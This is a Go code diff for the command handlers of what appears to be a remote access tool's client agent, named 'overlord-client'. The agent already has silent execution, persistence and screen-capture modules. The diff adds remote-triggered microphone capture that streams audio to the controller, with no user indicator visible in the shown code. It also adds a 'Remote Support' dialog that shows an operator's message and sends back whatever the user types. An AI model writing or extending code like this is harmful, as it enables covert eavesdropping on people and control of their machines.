@@ -2,15 +2,19 @@ package handlers
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
+	"fmt"
 	"log"
 	"os"
+	"os/exec"
 	goruntime "runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	"overlord-client/cmd/agent/audio"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/console"
 	"overlord-client/cmd/agent/persistence"
@@ -24,7 +28,15 @@ var ErrReconnect = errors.New("reconnect requested")
 var (
 	activeCommands   = make(map[string]context.CancelFunc)
 	activeCommandsMu sync.Mutex
+	voiceSessionMu   sync.Mutex
+	voiceSession     *voiceRuntime
 )
+
+type voiceRuntime struct {
+	sessionID string
+	cancel    context.CancelFunc
+	session   *audio.Session
+}
 
 func cancelAllCommands() {
 	activeCommandsMu.Lock()
@@ -73,6 +85,8 @@ func resetForReconnect(env *runtime.Env) {
 	if env.Console != nil {
 		env.Console.StopAll()
 	}
+
+	stopVoiceSession()
 
 	env.NotificationMu.Lock()
 	env.NotificationKeywords = nil
@@ -248,6 +262,171 @@ func payloadNumberToInt64(value interface{}) int64 {
 	default:
 		return 0
 	}
+}
+
+func stopVoiceSession() {
+	voiceSessionMu.Lock()
+	v := voiceSession
+	voiceSession = nil
+	voiceSessionMu.Unlock()
+	if v == nil {
+		return
+	}
+	if v.cancel != nil {
+		v.cancel()
+	}
+	if v.session != nil {
+		_ = v.session.Close()
+	}
+}
+
+func startVoiceSession(ctx context.Context, env *runtime.Env, sessionID string, source string) error {
+	if sessionID == "" {
+		return errors.New("missing voice session id")
+	}
+
+	stopVoiceSession()
+
+	vCtx, cancel := context.WithCancel(ctx)
+	session, err := audio.StartVoiceSession(vCtx, source, func(chunk []byte) {
+		if len(chunk) == 0 {
+			return
+		}
+		msg := map[string]interface{}{
+			"type":      "voice_uplink",
+			"sessionId": sessionID,
+			"data":      chunk,
+		}
+		_ = wire.WriteMsg(vCtx, env.Conn, msg)
+	})
+	if err != nil {
+		cancel()
+		return err
+	}
+
+	v := &voiceRuntime{sessionID: sessionID, cancel: cancel, session: session}
+	voiceSessionMu.Lock()
+	voiceSession = v
+	voiceSessionMu.Unlock()
+
+	return nil
+}
+
+func writeVoiceDownlink(data []byte) error {
+	voiceSessionMu.Lock()
+	v := voiceSession
+	voiceSessionMu.Unlock()
+	if v == nil || len(data) == 0 {
+		return nil
+	}
+	if v.session == nil {
+		return errors.New("voice session not ready")
+	}
+	if err := v.session.WritePlayback(data); err != nil {
+		return err
+	}
+	return nil
+}
+
+func showSupportChatDialog(message, operator string, requireReply bool) (string, error) {
+	msg := strings.TrimSpace(message)
+	if msg == "" {
+		return "", errors.New("missing support message")
+	}
+	title := "Remote Support"
+	if operator = strings.TrimSpace(operator); operator != "" {
+		title = fmt.Sprintf("Remote Support - %s", operator)
+	}
+
+	switch goruntime.GOOS {
+	case "windows":
+		return showSupportChatWindows(msg, title, requireReply)
+	case "darwin":
+		return showSupportChatDarwin(msg, title, requireReply)
+	case "linux":
+		return showSupportChatLinux(msg, title, requireReply)
+	default:
+		return "", fmt.Errorf("support chat is not supported on %s", goruntime.GOOS)
+	}
+}
+
+func showSupportChatWindows(message, title string, requireReply bool) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
+	var cmd *exec.Cmd
+	if requireReply {
+		script := `[void][Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic'); $resp=[Microsoft.VisualBasic.Interaction]::InputBox($env:OVERLORD_SUPPORT_MESSAGE,$env:OVERLORD_SUPPORT_TITLE,''); Write-Output $resp`
+		cmd = exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-Command", script)
+	} else {
+		script := `Add-Type -AssemblyName PresentationFramework; [void][System.Windows.MessageBox]::Show($env:OVERLORD_SUPPORT_MESSAGE,$env:OVERLORD_SUPPORT_TITLE,[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)`
+		cmd = exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-Command", script)
+	}
+	cmd.Env = append(os.Environ(),
+		"OVERLORD_SUPPORT_MESSAGE="+message,
+		"OVERLORD_SUPPORT_TITLE="+title,
+	)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("windows support dialog failed: %w", err)
+	}
+	if !requireReply {
+		return "", nil
+	}
+	return strings.TrimSpace(string(out)), nil
+}
+
+func showSupportChatDarwin(message, title string, requireReply bool) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
+	esc := func(s string) string {
+		s = strings.ReplaceAll(s, `\\`, `\\\\`)
+		s = strings.ReplaceAll(s, `"`, `\\"`)
+		return s
+	}
+	msg := esc(message)
+	ttl := esc(title)
+
+	var script string
+	if requireReply {
+		script = fmt.Sprintf(`text returned of (display dialog "%s" with title "%s" default answer "" buttons {"Send"} default button "Send")`, msg, ttl)
+	} else {
+		script = fmt.Sprintf(`display dialog "%s" with title "%s" buttons {"OK"} default button "OK"`, msg, ttl)
+	}
+
+	out, err := exec.CommandContext(ctx, "osascript", "-e", script).CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("macOS support dialog failed: %w", err)
+	}
+	if !requireReply {
+		return "", nil
+	}
+	return strings.TrimSpace(string(out)), nil
+}
+
+func showSupportChatLinux(message, title string, requireReply bool) (string, error) {
+	if _, err := exec.LookPath("zenity"); err != nil {
+		return "", errors.New("zenity is required for support chat on Linux")
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
+	if requireReply {
+		cmd := exec.CommandContext(ctx, "zenity", "--entry", "--title", title, "--text", message)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return "", fmt.Errorf("linux support input failed: %w", err)
+		}
+		return strings.TrimSpace(string(out)), nil
+	}
+
+	cmd := exec.CommandContext(ctx, "zenity", "--info", "--title", title, "--text", message)
+	if _, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("linux support message failed: %w", err)
+	}
+	return "", nil
 }
 
 func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
@@ -1116,6 +1295,36 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		_ = sessionID
 		console.Resize(sessionID, cols, rows)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "voice_session_start":
+		sessionID, _ := envelopePayloadString(envelope, "sessionId")
+		source := "default"
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload != nil {
+			if v, ok := payload["source"].(string); ok && strings.TrimSpace(v) != "" {
+				source = strings.TrimSpace(v)
+			}
+		}
+		if err := startVoiceSession(ctx, env, sessionID, source); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "voice_session_stop":
+		stopVoiceSession()
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "voice_downlink":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload"})
+		}
+		data, _ := payload["data"].([]byte)
+		if err := writeVoiceDownlink(data); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "voice_capabilities":
+		caps := audio.ProbeCapabilities()
+		payload, _ := json.Marshal(caps)
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: caps.Available, Message: string(payload)})
 	}
 
 	switch action {
@@ -1270,6 +1479,24 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			scriptType = "powershell"
 		}
 		return HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType)
+	case "support_chat":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		message, _ := payload["message"].(string)
+		operator, _ := payload["operator"].(string)
+		requireReply := true
+		if payload != nil {
+			if v, ok := payload["requireReply"].(bool); ok {
+				requireReply = v
+			}
+		}
+		reply, err := showSupportChatDialog(message, operator, requireReply)
+		if err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		if requireReply {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true, Message: strings.TrimSpace(reply)})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true, Message: "delivered"})
 	case "silent_exec":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		if payload == nil {
